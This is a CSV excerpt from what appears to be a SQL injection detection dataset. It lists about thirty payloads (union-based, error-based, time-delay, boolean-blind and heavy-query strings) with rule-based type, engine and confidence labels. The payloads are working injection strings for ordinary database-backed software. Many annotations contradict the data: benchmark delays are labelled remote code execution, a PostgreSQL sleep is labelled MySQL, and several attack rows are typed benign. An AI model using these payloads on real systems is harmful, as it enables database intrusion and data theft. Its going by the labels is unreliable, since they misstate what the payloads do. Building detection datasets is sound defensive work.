row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
6840,"-3472' or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",1,,error_based,generic,0.95,convert ( int detected — error_based injection (priority 4) on generic,rule-based
6841,"1' ) ) as wves where 2641 = 2641 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",1,,rce,generic,0.95,0x6d457153 detected — rce injection (priority 1) on generic,rule-based
6842,"1"" ) as yphz where 8174 = 8174 union all select null,null,null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
6843,"1%"" ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --",1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
6844,"1'|| ( select 'ukfj' where 7133 = 7133 union all select null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
6845,"-6546"" ) order by 1#",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
6846,"1%' or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers detected — heavy_query injection (priority 6) on generic",rule-based
6847,"-9032 ) ) union all select 8377,8377,8377,8377,8377,8377,8377,8377,8377#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
6848,-6792 ) ) as zlho where 4758 = 4758 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,1,,boolean_blind,generic,0.95,4758 = 4758 or detected — boolean_blind injection (priority 8) on generic,rule-based
6849,"1' ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
6850,"1', ( select ( case when ( 5249 = 9648 ) then 1 else 1/ ( select 0 ) end ) )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
6851,"1"" ) as qwyt where 4236 = 4236 union all select null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
6852,select ( case when ( 2783 = 9216 ) then 1 else 2783* ( select 2783 from master..sysdatabases ) end ) --,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
6853,"-2643%"" union all select 7779,7779--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
6854,"1%"" or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ""%"" = """,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
6855,"-1526' ) ) or elt ( 1032 = 1032,3623 ) and ( ( 'xpob' = 'xpob",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
6856,1 where 1931 = 1931 and sleep ( 5 ) --,1,,time_blind,mysql,0.95,"sleep (, and sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
6857,1' or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ),1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
6858,"-4515"" ) or elt ( 4545 = 2509,2509 ) and ( ""lglx"" = ""lglx",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
6859,"1%"" ) ) ) and make_set ( 8191 = 7813,7813 ) and ( ( ( ""%"" = """,1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
6860,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
6861,"1"" ) where 5491 = 5491",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
6862,"1%"" ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",1,,rce,generic,0.95,0x4b774c75 detected — rce injection (priority 1) on generic,rule-based
6863,"1' ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
6864,"1"" ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( ""hmun"" = ""hmun",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
6865,"1%' ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",1,,rce,generic,0.95,0x544d5a4c detected — rce injection (priority 1) on generic,rule-based
6866,-8625 or 3176 = 2519# fvgl,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
6867,"1',iif ( 9496 = 4153,1,1/0 )",1,,unknown,unknown,0.5,Insufficient information to classify,rule-based
6868,"1' where 6963 = 6963 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,,boolean_blind,generic,0.95,6963 = 6963 and detected — boolean_blind injection (priority 8) on generic,rule-based
6869,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
